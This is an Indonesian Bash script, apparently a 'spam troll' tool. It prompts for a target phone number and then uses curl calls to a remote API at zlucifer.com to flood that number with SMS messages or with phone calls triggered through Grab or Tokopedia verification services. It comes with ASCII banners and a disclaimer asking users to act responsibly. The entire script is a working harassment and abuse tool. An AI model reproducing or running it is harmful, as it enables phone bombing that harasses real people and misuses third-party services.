#!/bin/bash
#///////////////////////////////////////////////////////////////////////////////
#///////////////////////////////////////////////////////////////////////////////
#////                       _            _  __                              ////
#////                      | |          (_)/ _|                             ////
#////                   ___| |_   _  ___ _| |_ ___ _ __                     ////
#////                  |_  / | | | |/ __| |  _/ _ \ '__|                    ////
#////                   / /| | |_| | (__| | ||  __/ |                       ////
#////                  /___|_|\__,_|\___|_|_| \___|_|                       ////
#////                                                                       ////
#///////////////////////////////////////////////////////////////////////////////
#////////////////////////////////////////////////////////////////////////////////#PERINGATAN : KESALAHAN ATAU KEJAHATAN ADALAH TANGGUNG JAWAB DARI PEMAKAI
#GUNAKAN TOOLS UNTUK KEBAIKAN JANGAN DISALAH GUNAKAN :)
troll(){
    clear
    sleep 0.03
    figlet McH313 | lolcat
    echo "██████████████████
█▓███▓██▓█▓█▓█▓▓▓█
█▓███▓██▓█▓▓██▓▓██
█▓███▓▓█▓█▓█▓█▓▓▓█
██████████████████
█▓█▓██▓██▓▓█▓█▓███
█▓▓▓█▓▓▓█▓██▓▓████
█▓█▓█▓█▓█▓▓█▓█▓███
██████████████████" | lolcat
    echo " ============================="
    sleep 2
    echo " ===      spamm_troll      === "
    sleep 0.7
    echo " ============================="
}
load(){
    echo -e "\n"
    bar=" >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> "
    barlength=${#bar}
    i=0
    while((i<100)); do
        n=$((i*barlength / 100))
        printf "\e[00;32m\r[%-${barlength}s]\e[00m" "${bar:0:n}"
        ((i += RANDOM%5+2))
        sleep 0.2
    done
}
get_sms=$(curl -s http://zlucifer.com/api/hackbae.php?request=sms)
get_call=$(curl -s http://zlucifer.com/api/hackbae.php?request=call)
mulai (){
    echo "Gunakan Tools lagi?"
    echo "y/n?"
    echo
    read lagi
    if [ $lagi = "y" ]; then
            spam
    else
            echo "Terimakasih sudah menggunakan Tools ini :)"
    fi
}
#spam
spam(){
    clear
    troll
    echo
    echo "[1] Spam SMS"
    echo "[2] Spam Telpon"
    echo "[3] tutup tools"
    echo
    echo "1/2/3?"
    read pilih
    if [ $pilih = "1" ]; then
            echo "Troll Spam SMS"
            #function spam
            echo
            echo "Silahkan masukan nomor telp target"
            echo contoh 081234567890
            read target # masukin no telp
            echo
            echo "Berapa sms yang mau dikirim?"
            read paket
            echo
            echo Apakah nomor $target "dan SMS dikirim "$paket" sudah benar?"
            echo y/n?
            read confirm
            echo
            if [ $confirm = "y" ]; then
                    load
                    clear
                    echo melakukan spam sms ke nomor $target
                    echo
                    echo "Jangan close aplikasi sebelum spam selesai"
                    echo "========================================"
                    target_do=$get_sms'/sms.php?nomor='$target'&paket='$paket
                    CURL_RESPONSE=`curl -s -o /dev/null -w "%{http_code}" $target_do`
                    echo " Gunakan tools dengan bijak"
                    echo
                    echo " Love u always "
                    echo " -McH313WH "
                    echo "======================================="
            else
                    echo "Kesalahan"
            fi
        mulai
    elif [ $pilih = "2" ]; then
            echo "Troll Spam Call"
            #function spam
            echo
            echo "Silahkan masukan nomor telp target"
            echo contoh 081234567890
            read target # masukin no telp
            echo
            echo "Gunakan API Grab/Toped?"
            echo "[1] GRAB"
            echo "[2] Tokopedia"
            echo "1/2?"
            read api
            if [ $api = "1" ]; then
                  api_spam="grab"
            else
                  api_spam="tokopedia"
            fi
            echo Apakah nomor $target dan spam menggunakan $api_spam "sudah benar?"
            echo y/n?
            read confirm
            echo
            if [ $confirm = "y" ]; then
                  load
                  clear
                  echo Melakukan spam call ke nomor $target
                  echo
                  echo "Jangan close aplikasi sebelum spam selesai"
                  echo "========================================"
                  cek_target=`curl -s $get_call/call.php?nomor=$target"&method="$api_spam`                  echo -e $cek_target
                  echo " Gunakan tools dengan bijak"
                  echo
                  echo " Love u always "
                  echo " -McH313WH "
                  echo "========================================"
            else
                  echo terjadi kesalahan pada tools, mohon coba lagi
            fi
        mulai
    elif [ $pilih = "3" ]; then
        echo "Terimakasih sudah menggunakan tools ini :)"
        close
    else
        clear
        echo "Kesalahan"
        mulai
    fi
}
close(){
    exit
}
clear
echo "Loading.."
load
clear
troll
echo Selamat datang kak, Siapa nick kaka? #tulisan keluar
read nick #membaca yang ditulis
clear
troll
echo Selamat datang $nick ":)"
echo
echo "Mulai Project?"
echo "y/n?"
read mulai
if [ $mulai = "y" ]; then
      spam
else
      close
fi
